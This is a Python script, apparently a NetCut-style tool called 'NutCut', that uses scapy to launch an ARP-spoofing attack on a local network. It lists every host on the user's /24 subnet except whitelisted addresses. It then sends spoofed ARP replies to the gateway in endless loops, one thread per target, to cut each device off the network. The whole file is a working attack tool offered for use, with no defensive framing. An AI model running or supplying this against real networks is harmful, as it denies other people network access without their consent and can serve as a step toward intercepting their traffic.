from warnings import filterwarnings
filterwarnings("ignore")
from scapy.all import *
import subprocess, locale
import platform

def getOwnIp():
    if platform.system() == "Windows":
        cmd = "ipconfig | findstr IPv4"
        output = subprocess.check_output(cmd, shell=True)
        encoding = locale.getpreferredencoding()
        ownip = str(output.decode(encoding)).split(":")[1].strip()
    if platform.system() == "Linux":
        cmd = "ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}'"
        output = subprocess.check_output(cmd, shell=True)
        ownip = output.decode().strip()
        
    print(f"Your current IP is : {ownip}")
    print("Check if this ip is you're real local ip with ifconfig or ipconfig")
    answer = input(f"Is {ownip} ip correct ? Y or N :")
    if answer.lower() == "y":
        return ownip
    else:
        realLocalIp = input("Enter real local ip: ")
        return realLocalIp

ownIp = getOwnIp()

def createIpList(ownip):
    exeptions = input("Would you like to whitelist any other IP(s) than you're ? Y or N : ")
    whitelist = []
    if str(exeptions).lower() == "y":
        ExIps = input("Enter IP(s) separate by comma. Example 192.168.1.22,192.168.1.23,192.168.1.24 : ")
        ExIpsList = ExIps.split(",")
        for Ipps in ExIpsList:
            subIp = str(Ipps).split(".")[-1]
            whitelist.append(subIp)
    subIp = str(ownip).split(".")[-1]
    print('subip:',subIp)
    baseIp = ".".join(str(ownip).split(".")[:3])
    MAX = 254
    f = open("target_ips.txt", "w")
    try:
        for i in range(1, MAX+1):
            if i != int(subIp):
                if str(i) not in whitelist:
                    txt = baseIp + f".{i}\n"
                    f.write(txt)
        f.close()
    except Exception:
        print("It seems like you're local ip is False or something went wrong...")
        exit()
    return whitelist

whiteListIps = createIpList(ownIp)

try:
    gateway_ip = conf.route.route("0.0.0.0")[2]
except Exception:
    print("Error: Unable to get gateway IP")
    exit()

def nutcut(target_ip):
    pkt = ARP(psrc=target_ip, pdst=gateway_ip)
    send(pkt, verbose=0, loop=1)

def main(ExIpsList):
    import threading
    import os

    if not os.path.exists("./target_ips.txt"):
        open("./target_ips.txt", "w")
        print("Error: target_ips.txt not found. Created for you, please edit it")
        return
    
    with open("./target_ips.txt", "r") as file:
        target_list = file.read().strip().splitlines()
        file.close()
    
    if not target_list:
        print("Error: target_ips.txt is empty. Please edit it first")
        return

    for target_ip in target_list:
        print(f"NutCut initializing agaisn't {target_ip}")
        threading.Thread(target=nutcut, args=[target_ip], daemon=True).start()

    try:
        print(f"Target Count: {len(target_list)}\n")
        print(f"WhiteListed IPs : {whiteListIps} + You're own IP")
        input("\n: Press Enter or CTRL+C to stop :")
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    print("\033[?25l", end="")
    main(whiteListIps)
    print("\033[?25h", end="")
